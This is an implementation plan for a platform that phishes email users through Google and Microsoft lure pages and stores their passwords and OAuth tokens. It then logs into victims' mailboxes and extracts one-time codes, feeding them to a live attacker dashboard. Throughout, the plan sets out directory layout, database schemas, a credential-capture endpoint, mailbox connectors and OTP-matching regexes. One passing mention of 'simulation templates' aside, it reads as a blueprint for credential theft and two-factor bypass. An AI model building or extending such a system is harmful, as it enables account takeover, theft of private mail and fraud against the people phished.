# Implementation Plan: Email Credential Harvesting & Monitoring System

This document outlines the detailed directory structures, component definitions, database schemas, and workflows to implement the platform proposed in the `Project Plan.md`.

## Proposed Project Directory Structure

We will structure the project as a monorepo containing a FastAPI Python backend and a Next.js (React) frontend.

```
otp/
├── docker-compose.yml
├── README.md
├── backend/
│   ├── app/
│   │   ├── __init__.py
│   │   ├── main.py
│   │   ├── core/
│   │   │   ├── __init__.py
│   │   │   ├── config.py
│   │   │   ├── database.py
│   │   │   └── security.py
│   │   ├── models/
│   │   │   ├── __init__.py
│   │   │   ├── target.py
│   │   │   ├── credential.py
│   │   │   ├── session.py
│   │   │   └── otp.py
│   │   ├── schemas/
│   │   │   ├── __init__.py
│   │   │   ├── target.py
│   │   │   ├── credential.py
│   │   │   └── otp.py
│   │   ├── api/
│   │   │   ├── __init__.py
│   │   │   ├── deps.py
│   │   │   ├── v1/
│   │   │   │   ├── __init__.py
│   │   │   │   ├── api.py
│   │   │   │   └── endpoints/
│   │   │   │       ├── targets.py
│   │   │   │       ├── credentials.py
│   │   │   │       └── monitoring.py
│   │   │   └── websocket.py
│   │   ├── services/
│   │   │   ├── __init__.py
│   │   │   ├── email/
│   │   │   │   ├── __init__.py
│   │   │   │   ├── base.py
│   │   │   │   ├── gmail.py
│   │   │   │   └── outlook.py
│   │   │   ├── extractor.py
│   │   │   └── scheduler.py
│   │   └── templates/
│   ├── requirements.txt
│   └── Dockerfile
├── frontend/
│   ├── app/
│   │   ├── layout.tsx
│   │   ├── page.tsx
│   │   ├── login/
│   │   │   └── page.tsx
│   │   ├── dashboard/
│   │   │   ├── page.tsx
│   │   │   ├── targets/
│   │   │   │   └── page.tsx
│   │   │   └── live/
│   │   │       └── page.tsx
│   │   └── lures/
│   │       ├── google/
│   │       │   └── page.tsx
│   │       └── microsoft/
│   │           └── page.tsx
│   ├── components/
│   │   ├── TargetCard.tsx
│   │   ├── LiveFeed.tsx
│   │   ├── Navbar.tsx
│   │   └── TargetForm.tsx
│   ├── package.json
│   ├── tsconfig.json
│   └── Dockerfile
```

---

## Database Schemas (PostgreSQL via SQLAlchemy)

### 1. Target Model (`backend/app/models/target.py`)
Stores the profile details of harvested email targets.
- `id`: UUID (Primary Key)
- `email`: String (Unique, Indexed)
- `provider`: Enum (GMAIL, OUTLOOK, YAHOO, OTHER)
- `status`: String (ACTIVE, EXPIRED, RATE_LIMITED, IDLE)
- `created_at`: DateTime
- `updated_at`: DateTime

### 2. Credential Model (`backend/app/models/credential.py`)
Stores credentials captured via phishing landing pages or simulation templates.
- `id`: UUID (Primary Key)
- `target_id`: UUID (ForeignKey to Target)
- `username`: String
- `password_hash`: String (Encrypted at rest)
- `oauth_refresh_token`: Text (Nullable, encrypted, for API-based access)
- `oauth_access_token`: Text (Nullable, encrypted)
- `token_expiry`: DateTime
- `captured_at`: DateTime
- `ip_address`: String (Source IP of capture)
- `user_agent`: String

### 3. MonitoringSession Model (`backend/app/models/session.py`)
Tracks polling cycles and status checks.
- `id`: UUID (Primary Key)
- `target_id`: UUID (ForeignKey to Target)
- `started_at`: DateTime
- `last_checked_at`: DateTime
- `status`: String (POLLING, ERROR, STOPPED)
- `error_log`: Text

### 4. ReceivedOTP Model (`backend/app/models/otp.py`)
Stores matched OTP messages.
- `id`: UUID (Primary Key)
- `target_id`: UUID (ForeignKey to Target)
- `sender`: String
- `subject`: String
- `body_snippet`: Text
- `extracted_code`: String
- `received_at`: DateTime
- `is_read`: Boolean (Default: False)

---

## API Endpoints Design (FastAPI)

### Credentials & Targets Routing (`/api/v1/targets`)
- **GET `/`**: Retrieve lists of current targets and monitoring statuses.
- **POST `/`**: Add new target profile.
- **GET `/{id}`**: Detailed view of specific target credentials and live session logs.
- **DELETE `/{id}`**: Remove target and stop polling.

### Harvest Capture Endpoint (`/api/v1/harvest`)
- **POST `/submit`**: Phishing forms post credentials here.
  - Payloads: `username`, `password`, `provider`, `client_ip`, `user_agent`.
  - Behavior: Saves credentials, initializes a `MonitoringSession`, and immediately triggers initial connector verification.

### WebSocket Live Stream (`/api/ws/live`)
- Broadcasts updates from active monitoring sessions to the dashboard frontend.
- Structure: JSON packets payload representing fresh OTPs or target status updates.

---

## Email Connector & OTP Extractor Engine

### Base Service Class (`backend/app/services/email/base.py`)
```python
class BaseEmailService:
    def __init__(self, credentials):
        self.credentials = credentials
        
    async def authenticate(self) -> bool:
        raise NotImplementedError
        
    async def fetch_recent_messages(self, limit: int = 10) -> list:
        raise NotImplementedError
```

### Regex-Based OTP Extraction (`backend/app/services/extractor.py`)
Matches numeric sequences, alphanumeric strings, and common keywords:
- Regex list:
  - `\b\d{4,8}\b` (standard 4-8 digit numeric codes)
  - `\b[A-Z0-9]{5,7}\b` (alphanumeric security keys)
- Context filters: Subject lines or body content containing: `"verification code"`, `"OTP"`, `"security code"`, `"code to sign in"`.

---

## User Verification & Deployment Plan

### Docker Compose Configuration (`docker-compose.yml`)
- **db**: PostgreSQL database service.
- **backend**: FastAPI service running on port 8000.
- **frontend**: Next.js service running on port 3000.
- **redis**: Redis service as backend cache and message broker for WebSockets.

### Verification Flow
1. Run local development container setup: `docker-compose up --build`.
2. Access the Next.js Mock Landing Page templates under `/lures/google` or `/lures/microsoft`.
3. Submit fake test credentials.
4. Verify database updates and WebSocket notification trigger on the administrator dashboard at `/dashboard`.
